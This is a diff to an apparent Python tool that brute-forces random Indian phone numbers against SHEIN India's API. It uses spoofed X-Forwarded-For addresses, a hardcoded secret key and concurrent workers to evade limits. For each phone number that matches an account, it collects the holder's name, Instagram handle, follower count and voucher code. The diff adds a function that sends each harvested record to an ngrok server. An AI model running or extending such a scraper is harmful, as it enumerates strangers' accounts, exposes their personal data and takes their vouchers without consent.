@@ -1,3 +1,4 @@
+# test.py - Modified for remote saving
 import requests
 import random
 import json
@@ -12,25 +13,23 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
 # --- Setup and Configuration ---
-
 logging.basicConfig(
-    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO, datefmt='%H:%M:%S'
+    format="%(asctime)s - %(levelname)s - %(message)s", 
+    level=logging.INFO, 
+    datefmt='%H:%M:%S'
 )
 logger = logging.getLogger(__name__)
 
-# Output file where successful profiles will be saved
-OUTPUT_FILE = "Data_coupon.jsonl"
+# --- REMOTE SAVE CONFIGURATION ---
+SAVE_SERVER_URL = "https://phototactic-florida-lacunose.ngrok-free.dev/save_profile"  # <-- यहाँ आपका ngrok URL डालें
+MAX_RETRY_SAVE = 3
+SAVE_TIMEOUT = 10
 
 SECRET_KEY = os.environ.get("SHEIN_SECRET_KEY", "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg")
 
-
-# --- Core Fetcher Class (Optimized for Speed and Stability) ---
-
 class SheinCliFetcher:
-    """
-    A CLI utility to fetch SHEIN profile data, optimized for stability and speed using Session.
-    """
-
+    """A CLI utility to fetch SHEIN profile data, optimized for stability and speed."""
+    
     def __init__(self):
         # API URLs
         self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
@@ -40,14 +39,14 @@ class SheinCliFetcher:
 
         self.session = requests.Session()
         
-        # RETRY MECHANISM: 3 retries for stability
+        # RETRY MECHANISM
         retry_strategy = Retry(
             total=3, 
             backoff_factor=0.5, 
             status_forcelist=[500, 502, 503, 504],
         )
 
-        # CONNECTION POOL SIZE: Set to 25 (more than MAX_WORKERS=12)
+        # CONNECTION POOL SIZE
         adapter = HTTPAdapter(
             pool_connections=50, 
             pool_maxsize=50,
@@ -57,9 +56,8 @@ class SheinCliFetcher:
         self.session.mount('http://', adapter)
         self.session.mount('https://', adapter)
 
-
     # --- Utility Methods ---
-
+    
     def get_random_ip(self):
         """Generate random IP address for X-Forwarded-For header."""
         return ".".join(str(random.randint(0, 255)) for _ in range(4))
@@ -137,7 +135,6 @@ class SheinCliFetcher:
             client_token = self.extract_access_token(client_token_data)
             if not client_token: return None
 
-            # Small delay maintained here
             time.sleep(random.uniform(0.1, 0.3))
 
             account_data = self.check_shein_account(client_token, phone_number)
@@ -238,14 +235,15 @@ class SheinCliFetcher:
             voucher_code = self._safe_get_value(voucher_data, ['voucher_code'], default='N/A')
             voucher_amount = self._safe_get_value(voucher_data, ['voucher_amount'], default='0')
 
-            # Structured data for JSON saving
+            # Structured data for saving
             structured_data = {
                 "phone_number": phone_number,
                 "name": user_name,
                 "insta_user": username,
                 "insta_followers": followers_count,
                 "voucher_code": voucher_code,
-                "voucher_amount_rs": voucher_amount
+                "voucher_amount_rs": voucher_amount,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
             }
 
             response = f"""
@@ -266,13 +264,10 @@ class SheinCliFetcher:
             return f"❌ Error formatting profile data. Check logs.", None, None
 
     def generate_indian_numbers(self, count):
-        """Generate a list of random 10-digit Indian mobile numbers."""
+        """Generate a list of random 10-digit Indian mobile numbers starting with 6, 7, 8, or 9."""
         numbers = []
-        # --- MODIFICATION START ---
-        # Ab valid_starters mein sirf '9' hai
-        valid_starters = ['7'] 
-        # --- MODIFICATION END ---
-
+        valid_starters = ['6', '7', '8', '9']
+        
         for _ in range(count):
             first_digit = random.choice(valid_starters)
             remaining_digits = ''.join(random.choices('0123456789', k=9))
@@ -281,10 +276,7 @@ class SheinCliFetcher:
         return numbers
 
     def process_single_number(self, phone_number):
-        """
-        Main logic for a single phone number check with inner delays.
-        """
-
+        """Main logic for a single phone number check."""
         phone_number = ''.join(filter(str.isdigit, phone_number))
 
         if len(phone_number) != 10:
@@ -300,7 +292,6 @@ class SheinCliFetcher:
 
         # Step 2: Get creator token
         creator_token = self.get_creator_token(phone_number, encrypted_id)
-        # 🚀 FINAL STABILITY FIX: Inner delay increased (0.5 to 1.0s)
         time.sleep(random.uniform(0.5, 1.0))
 
         if not creator_token:
@@ -314,89 +305,105 @@ class SheinCliFetcher:
         else:
             return None
 
+# --- REMOTE SAVE FUNCTION ---
+def save_profile_remotely(profile_data):
+    """Save profile data to remote server via ngrok."""
+    if not SAVE_SERVER_URL or SAVE_SERVER_URL == "http://your-ngrok-url.ngrok.io/save_profile":
+        logger.error("⚠️  SAVE_SERVER_URL not configured! Profile will not be saved.")
+        return False
+    
+    for attempt in range(MAX_RETRY_SAVE):
+        try:
+            response = requests.post(
+                SAVE_SERVER_URL,
+                json=profile_data,
+                timeout=SAVE_TIMEOUT
+            )
+            
+            if response.status_code == 200:
+                logger.info(f"✅ Profile saved remotely for {profile_data.get('phone_number')}")
+                return True
+            else:
+                logger.warning(f"Save server returned status {response.status_code}: {response.text}")
+                
+        except Exception as e:
+            logger.warning(f"Attempt {attempt + 1} failed to save remotely: {e}")
+            
+        if attempt < MAX_RETRY_SAVE - 1:
+            time.sleep(1)
+    
+    logger.error(f"❌ Failed to save profile for {profile_data.get('phone_number')} after {MAX_RETRY_SAVE} attempts")
+    return False
+
 # --- Main CLI Automation Logic ---
-
-def save_profile_data(formatted_data):
-    """Save the found profile data (minimal fields) to a JSON Lines file."""
-    try:
-        data_to_save = formatted_data.copy()
-        data_to_save["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
-
-        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
-            f.write(json.dumps(data_to_save) + '\n')
-
-    except Exception as e:
-        logger.error(f"Failed to save profile: {e}")
-
 def main_cli_automation():
     """CLI Entry point for continuous concurrent automation."""
-
+    
     if len(sys.argv) > 1:
         print("⚠️ Warning: Command line argument for test count is ignored for infinite mode.")
-
+    
+    # Check if save server URL is configured
+    if SAVE_SERVER_URL == "http://your-ngrok-url.ngrok.io/save_profile":
+        print("\n" + "!"*60)
+        print("⚠️  WARNING: SAVE_SERVER_URL is not configured!")
+        print("   Please update SAVE_SERVER_URL in the script with your ngrok URL")
+        print("   Format: http://XXXX-XX-XX-XX-XX.ngrok.io/save_profile")
+        print("!"*60 + "\n")
+    
     fetcher = SheinCliFetcher()
-
-    # 🚀 FINAL STABILITY FIX: Workers reduced from 20 to 12
-    MAX_WORKERS =12
-    # Batch size
+    
+    MAX_WORKERS = 12
     BATCH_SIZE = 1200
-
+    
     total_checked = 0
     found_count = 0
-
+    
     print("\n" + "#"*60)
-    print(f"🚀 Starting CONTINUOUS test mode with {MAX_WORKERS} workers (Optimized for Stability).")
-    print(f"   Batch Size: {BATCH_SIZE} numbers per cycle.")
-    print(f"   Expected Stable Rate: ~4,000 Tests/Minute")
-    print("   Press Ctrl+C to stop the process.")
-    print(f"💾 Successful (minimal) profiles will be saved to: {OUTPUT_FILE}")
-    key_status = 'Loaded from ENV' if os.environ.get('SHEIN_SECRET_KEY') else 'Using Hardcoded Default'
-    print(f"🔑 Secret Key Status: {key_status}")
+    print(f"🚀 Starting CONTINUOUS test mode with {MAX_WORKERS} workers")
+    print(f"   Batch Size: {BATCH_SIZE} numbers per cycle")
+    print(f"   Save Server: {SAVE_SERVER_URL}")
+    print("   Press Ctrl+C to stop the process")
     print("#"*60 + "\n")
-
+    
     try:
         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-
+            
             while True:
-                # 1. Generate a fresh batch of random numbers
                 numbers_to_test = fetcher.generate_indian_numbers(BATCH_SIZE)
-
-                logger.info(f"--- Generated next batch of {BATCH_SIZE} numbers. ---")
-
-                # 2. Submit all tasks to the thread pool
+                logger.info(f"--- Generated next batch of {BATCH_SIZE} numbers ---")
+                
                 results = executor.map(fetcher.process_single_number, numbers_to_test)
-
-                # 3. Process results for the batch
+                
                 for result in results:
                     total_checked += 1
-
+                    
                     if result:
                         phone_number, profile_data = result
-
                         formatted_response, _, structured_data = fetcher.format_profile_response(profile_data, phone_number)
-
+                        
                         if structured_data:
                             found_count += 1
-                            save_profile_data(structured_data)
-
+                            
+                            # Save remotely
+                            save_success = save_profile_remotely(structured_data)
+                            
                             print("\n" + "="*60)
                             print(f"🎉 FOUND PROFILE! (Total checked: {total_checked}, Found: {found_count})")
                             print(formatted_response)
+                            print(f"💾 Save Status: {'✅ Remote' if save_success else '❌ Failed'}")
                             print("="*60 + "\n")
-
-                # Pause time adjusted (important for rate limiting and resource cool-down)
+                
                 time.sleep(random.uniform(2.0, 3.0))
-
+                
     except KeyboardInterrupt:
         print("\n\n" + "🛑"*25)
-        print("🛑 User requested to stop the script. Shutting down threads...")
+        print("🛑 Script stopped by user")
         print(f"✅ Final Summary:")
         print(f"Total Numbers Checked: {total_checked}")
         print(f"Profiles Found: {found_count}")
         print("🛑"*25 + "\n")
     except Exception as e:
         logger.critical(f"A critical error occurred: {e}")
-
 
 if __name__ == "__main__":
     main_cli_automation()
